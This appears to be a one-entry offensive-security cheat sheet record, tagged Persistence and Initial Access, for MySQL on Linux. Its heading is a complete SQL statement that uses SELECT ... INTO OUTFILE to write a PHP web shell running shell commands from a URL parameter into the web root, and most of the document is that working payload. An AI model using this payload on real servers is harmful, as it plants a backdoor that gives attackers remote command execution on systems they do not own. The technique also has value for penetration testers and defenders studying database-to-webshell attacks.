# SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

OS: Linux
Description: MySQL write to filesystem
Security Domains: Persistence (https://www.notion.so/Persistence-1434c8e523768074b5d4daa95c78dbbb?pvs=21), Initial Access (https://www.notion.so/Initial-Access-1444c8e5237680db9b3afd69d2c38487?pvs=21)
Target_Technology: mysql (https://www.notion.so/mysql-1444c8e523768019a5acd8abdc5f59f6?pvs=21)